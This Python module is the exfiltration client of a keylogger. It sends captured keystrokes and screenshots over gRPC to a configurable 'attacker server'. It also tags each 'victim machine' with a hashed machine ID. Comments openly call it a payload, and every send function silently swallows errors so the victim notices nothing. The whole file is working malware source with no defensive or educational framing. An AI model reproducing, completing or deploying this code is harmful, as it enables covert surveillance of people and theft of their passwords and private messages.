import grpc
import os
from datetime import datetime
from .protos import server_pb2 as keylog_pb2
from .protos import server_pb2_grpc as keylog_pb2_grpc

# ── Runtime-configurable connection settings ──────────────────────────────────
_host = "127.0.0.1"
_port = 50051
_stub = None   # rebuilt whenever configure() is called
_client_id = None  # unique identifier for this victim machine


def configure(host: str, port: int, client_id: str = None):
    """
    Point the gRPC client at a specific attacker server.
    Call this once at payload startup before the keylogger runs.

    Example:
        import cln
        cln.configure("192.168.1.10", 50051)
    """
    global _host, _port, _stub, _client_id
    _host = host
    _port = int(port)
    _client_id = client_id or _generate_client_id()
    channel = grpc.insecure_channel(f"{_host}:{_port}")
    _stub = keylog_pb2_grpc.KeylogServiceStub(channel)


def _generate_client_id():
    """Generate a unique client ID based on machine info."""
    import platform
    import hashlib
    info = f"{platform.node()}-{platform.system()}-{platform.machine()}"
    return hashlib.md5(info.encode()).hexdigest()[:12]


def _ensure_stub():
    """Lazy-initialize stub on first use (default host/port)."""
    global _stub, _client_id
    if _stub is None:
        channel = grpc.insecure_channel(f"{_host}:{_port}")
        _stub = keylog_pb2_grpc.KeylogServiceStub(channel)
    if _client_id is None:
        _client_id = _generate_client_id()


def send_key_non_blocking(text: str):
    """
    Send a keystroke string to the attacker gRPC server WITHOUT blocking.
    Uses whatever host/port was set by configure() (or the default).

    Args:
        text: the message to transmit (key + context info)
    """
    try:
        _ensure_stub()
        _stub.SendKeylog.future(keylog_pb2.KeylogRequest(message=text))
    except Exception:
        # Silently swallow — victim machine must not surface gRPC errors
        pass


def send_screenshot_non_blocking(filepath: str):
    """
    Send a screenshot image to the attacker gRPC server WITHOUT blocking.
    Reads the image file and sends it as bytes.

    Args:
        filepath: path to the screenshot image file
    """
    try:
        _ensure_stub()
        if not os.path.exists(filepath):
            return
        
        with open(filepath, 'rb') as f:
            image_data = f.read()
        
        filename = os.path.basename(filepath)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        request = keylog_pb2.ScreenshotRequest(
            image_data=image_data,
            filename=filename,
            timestamp=timestamp,
            client_id=_client_id or _generate_client_id()
        )
        
        # Non-blocking call
        _stub.SendScreenshot.future(request)
        
    except Exception:
        # Silently swallow — victim machine must not surface gRPC errors
        pass


def send_screenshot_bytes_non_blocking(image_bytes: bytes, filename: str = None):
    """
    Send screenshot image bytes directly to the attacker gRPC server WITHOUT blocking.
    
    Args:
        image_bytes: raw image bytes (PNG/JPEG format)
        filename: optional filename, auto-generated if None
    """
    try:
        _ensure_stub()
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        if filename is None:
            filename = f"screenshot_{timestamp}.png"
        
        request = keylog_pb2.ScreenshotRequest(
            image_data=image_bytes,
            filename=filename,
            timestamp=timestamp,
            client_id=_client_id or _generate_client_id()
        )
        
        # Non-blocking call
        _stub.SendScreenshot.future(request)
        
    except Exception:
        # Silently swallow — victim machine must not surface gRPC errors
        pass